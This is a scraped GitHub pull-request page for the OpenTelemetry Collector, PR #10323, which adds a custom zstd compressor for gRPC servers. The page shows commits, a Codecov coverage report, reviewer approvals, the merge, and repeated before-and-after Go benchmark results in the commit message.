`[cc9fcb1](/open-telemetry/opentelemetry-collector/pull/10323/commits/cc9fcb1a53e39d461cbbe129defa4473fc82f463)`

```
Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

 [![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling)
[jpkrohling](/jpkrohling)
requested review from
a team and
[djaglowski](/djaglowski)
[June 5, 2024 11:59](#event-13050073390)

 [jpkrohling](/jpkrohling)
added 2 commits
[June 5, 2024 14:02](#commits-pushed-26e5a40)

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)

`[fmt, changelog](/open-telemetry/opentelemetry-collector/pull/10323/commits/26e5a40df7992075acfd07bbe80ecb43c84baa58 "fmt, changelog

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
 …

`[26e5a40](/open-telemetry/opentelemetry-collector/pull/10323/commits/26e5a40df7992075acfd07bbe80ecb43c84baa58)`

```
Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&v=4)](/jpkrohling)

`[lint](/open-telemetry/opentelemetry-collector/pull/10323/commits/76f0f90b2e3ef0fc8f3f887ee3feeb88fdac0d5d "lint

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
 …

`[76f0f90](/open-telemetry/opentelemetry-collector/pull/10323/commits/76f0f90b2e3ef0fc8f3f887ee3feeb88fdac0d5d)`

```
Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>
```

[![@codecov](https://avatars.githubusercontent.com/in/254?s=80&v=4)](/apps/codecov)
[![Codecov](https://avatars.githubusercontent.com/in/254?s=40&u=c392dd7c2afc51fe2347d4296afa8494ac05772e&v=4)](https://github.com/apps/codecov)

Copy link

### **[codecov](/apps/codecov) bot** commented [Jun 5, 2024](#issuecomment-2149703251)

|  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- |
| [Codecov](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/pull/10323?dropdown=coverage&src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry) Report Attention: Patch coverage is `82.35294%` with `6 lines` in your changes missing coverage. Please review.  Project coverage is 92.58%. Comparing base [(`d9dc6eb`)](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/commit/d9dc6ebae0078b901bee08988ab56b45de9f156c?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry) to head [(`76f0f90`)](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/commit/76f0f90b2e3ef0fc8f3f887ee3feeb88fdac0d5d?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry). Report is 1 commits behind head on main.   | [Files](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/pull/10323?dropdown=coverage&src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry) | Patch % | Lines | | --- | --- | --- | | [config/configgrpc/internal/zstd.go](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/pull/10323?src=pr&el=tree&filepath=config%2Fconfiggrpc%2Finternal%2Fzstd.go&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry#diff-Y29uZmlnL2NvbmZpZ2dycGMvaW50ZXJuYWwvenN0ZC5nbw==) | 81.81% | [5 Missing and 1 partial ⚠️](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/pull/10323?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry) |   Additional details and impacted files ``` @@            Coverage Diff             @@ ##             main   #10323      +/-   ## ========================================== - Coverage   92.62%   92.58%   -0.05%      ==========================================   Files         386      387       +1        Lines       18221    18254      +33      ========================================== + Hits        16877    16900      +23      - Misses       1000     1008       +8      - Partials      344      346       +2      ```   [☔ View full report in Codecov by Sentry](https://app.codecov.io/gh/open-telemetry/opentelemetry-collector/pull/10323?dropdown=coverage&src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry). 📢 Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=open-telemetry). |

All reactions

Sorry, something went wrong.

[![djaglowski](https://avatars.githubusercontent.com/u/5255616?s=60&v=4)](/djaglowski)

**[djaglowski](/djaglowski)**
approved these changes
[Jun 5, 2024](#pullrequestreview-2099153601)

 [View reviewed changes](/open-telemetry/opentelemetry-collector/pull/10323/files/76f0f90b2e3ef0fc8f3f887ee3feeb88fdac0d5d)

[![mx-psi](https://avatars.githubusercontent.com/u/5502710?s=60&v=4)](/mx-psi)

**[mx-psi](/mx-psi)**
approved these changes
[Jun 5, 2024](#pullrequestreview-2099240548)

 [View reviewed changes](/open-telemetry/opentelemetry-collector/pull/10323/files/76f0f90b2e3ef0fc8f3f887ee3feeb88fdac0d5d)

Copy link

Member

### @mx-psi **[mx-psi](/mx-psi)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Thanks!

Sorry, something went wrong.

All reactions

 Hide details
View details

[![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&u=f3e75d1eea47083cb122d48dee765a83b0eaf2aa&v=4)](/mx-psi)
[mx-psi](/mx-psi)
merged commit [`760f773`](/open-telemetry/opentelemetry-collector/commit/760f773df042305bd2d92e908cedc17957f6c542)
into
open-telemetry:main

[Jun 5, 2024](https://github.com/open-telemetry/opentelemetry-collector/pull/10323#event-13051556051)
48 of 49 checks passed

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
added this to the [next release](/open-telemetry/opentelemetry-collector/milestone/85) milestone
[Jun 5, 2024](#event-13051559343)

[mx-psi](/mx-psi)
pushed a commit
to mx-psi/opentelemetry-collector
that referenced
this pull request
[Jun 5, 2024](#ref-commit-699107d)
[![@jpkrohling](https://avatars.githubusercontent.com/u/13387?s=40&u=9ceb091c402688001623dcc1acd5833fc0d75e45&v=4)](/jpkrohling) [![@mx-psi](https://avatars.githubusercontent.com/u/5502710?s=40&v=4)](/mx-psi)

`[[configgrpc] Use own compressors for zstd (](/mx-psi/opentelemetry-collector/commit/699107d29f77fff00bd7a8cd414aa1f97a8c619c "[configgrpc] Use own compressors for zstd (#10323)

Uses our own version of the zstd compressor for gRPC servers. The code
for it is based on the gzip compressor that comes built-in with gRPC.

Benchmarks before this PR:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   71594	     19066 ns/op	     615 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  151503	      8544 ns/op	     640 B/op	       6 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 3632570	       303.8 ns/op	     304 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68114	     16938 ns/op	     748 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  138091	      8047 ns/op	     896 B/op	       6 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 3081198	       402.5 ns/op	     400 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   43414	     27174 ns/op	     386 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  117534	      9903 ns/op	   10112 B/op	       6 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	 1000000	      1190 ns/op	     528 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   67275	     17508 ns/op	     700 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  196862	      6137 ns/op	     848 B/op	       6 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 3595815	       331.7 ns/op	     272 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   64105	     19104 ns/op	     844 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  169221	      6929 ns/op	    1120 B/op	       6 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2602239	       473.0 ns/op	     336 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   33861	     36473 ns/op	     904 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  107828	     10596 ns/op	   16832 B/op	       6 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  725080	      1540 ns/op	     689 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   76315	     16394 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  193314	      5957 ns/op	     688 B/op	       6 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 3558649	       345.2 ns/op	     208 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   68497	     18413 ns/op	     699 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  177841	      6520 ns/op	    1136 B/op	       6 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2354102	       497.4 ns/op	     272 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   21943	     54603 ns/op	    1941 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   71260	     16077 ns/op	   25312 B/op	       6 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  335415	      3026 ns/op	    1200 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	37.766s
```

After this version:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   74952	     15710 ns/op	     603 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  156784	      6966 ns/op	     208 B/op	       2 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 2216174	       510.4 ns/op	     308 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68095	     18569 ns/op	     736 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  150705	      8849 ns/op	     294 B/op	       2 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 2149710	       556.8 ns/op	     406 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   40040	     26159 ns/op	     368 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  123043	     10254 ns/op	     299 B/op	       2 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	  726780	      1457 ns/op	     533 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   64660	     18186 ns/op	     701 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  193225	      6267 ns/op	     273 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 2925073	       418.2 ns/op	     276 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   61320	     20641 ns/op	     846 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  190965	      6440 ns/op	     321 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2051575	       656.8 ns/op	     341 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   30097	     40680 ns/op	     907 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  127027	      8437 ns/op	     363 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  716541	      1803 ns/op	     694 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   82287	     15054 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  230558	      5470 ns/op	     221 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 2759403	       417.1 ns/op	     211 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   58208	     18925 ns/op	     702 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  199226	      6247 ns/op	     256 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2065202	       609.8 ns/op	     276 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   20583	     59762 ns/op	    1945 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   98254	     13152 ns/op	     728 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  389401	      3976 ns/op	    1209 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	40.394s
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")[open-telemetry#10323](https://github.com/open-telemetry/opentelemetry-collector/pull/10323)[)](/mx-psi/opentelemetry-collector/commit/699107d29f77fff00bd7a8cd414aa1f97a8c619c "[configgrpc] Use own compressors for zstd (#10323)

Uses our own version of the zstd compressor for gRPC servers. The code
for it is based on the gzip compressor that comes built-in with gRPC.

Benchmarks before this PR:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   71594	     19066 ns/op	     615 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  151503	      8544 ns/op	     640 B/op	       6 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 3632570	       303.8 ns/op	     304 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68114	     16938 ns/op	     748 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  138091	      8047 ns/op	     896 B/op	       6 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 3081198	       402.5 ns/op	     400 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   43414	     27174 ns/op	     386 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  117534	      9903 ns/op	   10112 B/op	       6 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	 1000000	      1190 ns/op	     528 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   67275	     17508 ns/op	     700 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  196862	      6137 ns/op	     848 B/op	       6 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 3595815	       331.7 ns/op	     272 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   64105	     19104 ns/op	     844 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  169221	      6929 ns/op	    1120 B/op	       6 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2602239	       473.0 ns/op	     336 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   33861	     36473 ns/op	     904 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  107828	     10596 ns/op	   16832 B/op	       6 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  725080	      1540 ns/op	     689 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   76315	     16394 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  193314	      5957 ns/op	     688 B/op	       6 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 3558649	       345.2 ns/op	     208 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   68497	     18413 ns/op	     699 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  177841	      6520 ns/op	    1136 B/op	       6 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2354102	       497.4 ns/op	     272 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   21943	     54603 ns/op	    1941 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   71260	     16077 ns/op	   25312 B/op	       6 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  335415	      3026 ns/op	    1200 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	37.766s
```

After this version:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   74952	     15710 ns/op	     603 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  156784	      6966 ns/op	     208 B/op	       2 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 2216174	       510.4 ns/op	     308 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68095	     18569 ns/op	     736 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  150705	      8849 ns/op	     294 B/op	       2 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 2149710	       556.8 ns/op	     406 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   40040	     26159 ns/op	     368 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  123043	     10254 ns/op	     299 B/op	       2 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	  726780	      1457 ns/op	     533 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   64660	     18186 ns/op	     701 B/op	       4 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_201/compressor_zstd-16       	  193225	      6267 ns/op	     273 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_220/compressor_snappy-16     	 2925073	       418.2 ns/op	     276 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_249/compressor_gzip-16       	   61320	     20641 ns/op	     846 B/op	       4 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_256/compressor_zstd-16       	  190965	      6440 ns/op	     321 B/op	       2 allocs/op
md_trace_requestBenchmarkCompressors/md_trace_request/raw_bytes_329/compressed_bytes_279/compressor_snappy-16     	 2051575	       656.8 ns/op	     341 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_303/compressor_gzip-16      	   30097	     40680 ns/op	     907 B/op	       4 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_258/compressor_zstd-16      	  127027	      8437 ns/op	     363 B/op	       2 allocs/op
lg_trace_requestBenchmarkCompressors/lg_trace_request/raw_bytes_7025/compressed_bytes_591/compressor_snappy-16    	  716541	      1803 ns/op	     694 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_140/compressor_gzip-16      	   82287	     15054 ns/op	     496 B/op	       4 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_137/compressor_zstd-16      	  230558	      5470 ns/op	     221 B/op	       2 allocs/op
sm_metric_requestBenchmarkCompressors/sm_metric_request/raw_bytes_183/compressed_bytes_152/compressor_snappy-16    	 2759403	       417.1 ns/op	     211 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_194/compressor_gzip-16      	   58208	     18925 ns/op	     702 B/op	       4 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_198/compressor_zstd-16      	  199226	      6247 ns/op	     256 B/op	       2 allocs/op
md_metric_requestBenchmarkCompressors/md_metric_request/raw_bytes_376/compressed_bytes_222/compressor_snappy-16    	 2065202	       609.8 ns/op	     276 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_601/compressor_gzip-16    	   20583	     59762 ns/op	    1945 B/op	       5 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_559/compressor_zstd-16    	   98254	     13152 ns/op	     728 B/op	       2 allocs/op
lg_metric_requestBenchmarkCompressors/lg_metric_request/raw_bytes_10991/compressed_bytes_1055/compressor_snappy-16 	  389401	      3976 ns/op	    1209 B/op	       2 allocs/op
PASS
ok  	go.opentelemetry.io/collector/config/configgrpc	40.394s
```

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>

---------

Signed-off-by: Juraci Paixão Kröhling <juraci@kroehling.de>")`
…

`[699107d](/mx-psi/opentelemetry-collector/commit/699107d29f77fff00bd7a8cd414aa1f97a8c619c)`

```
Uses our own version of the zstd compressor for gRPC servers. The code
for it is based on the gzip compressor that comes built-in with gRPC.

Benchmarks before this PR:
```
Running tool: /usr/bin/go test -benchmem -run=^$ -bench ^BenchmarkCompressors$ go.opentelemetry.io/collector/config/configgrpc

sm_log_requestgoos: linux
goarch: amd64
pkg: go.opentelemetry.io/collector/config/configgrpc
cpu: 11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz
BenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_162/compressor_gzip-16         	   71594	     19066 ns/op	     615 B/op	       4 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_159/compressor_zstd-16         	  151503	      8544 ns/op	     640 B/op	       6 allocs/op
sm_log_requestBenchmarkCompressors/sm_log_request/raw_bytes_160/compressed_bytes_178/compressor_snappy-16       	 3632570	       303.8 ns/op	     304 B/op	       3 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_219/compressor_gzip-16         	   68114	     16938 ns/op	     748 B/op	       4 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_209/compressor_zstd-16         	  138091	      8047 ns/op	     896 B/op	       6 allocs/op
md_log_requestBenchmarkCompressors/md_log_request/raw_bytes_242/compressed_bytes_260/compressor_snappy-16       	 3081198	       402.5 ns/op	     400 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_253/compressor_gzip-16        	   43414	     27174 ns/op	     386 B/op	       3 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_216/compressor_zstd-16        	  117534	      9903 ns/op	   10112 B/op	       6 allocs/op
lg_log_requestBenchmarkCompressors/lg_log_request/raw_bytes_4850/compressed_bytes_454/compressor_snappy-16      	 1000000	      1190 ns/op	     528 B/op	       2 allocs/op
sm_trace_requestBenchmarkCompressors/sm_trace_request/raw_bytes_231/compressed_bytes_203/compressor_gzip-16       	   67275	     17508 ns/op	     700 B/op	       4 allocs/op
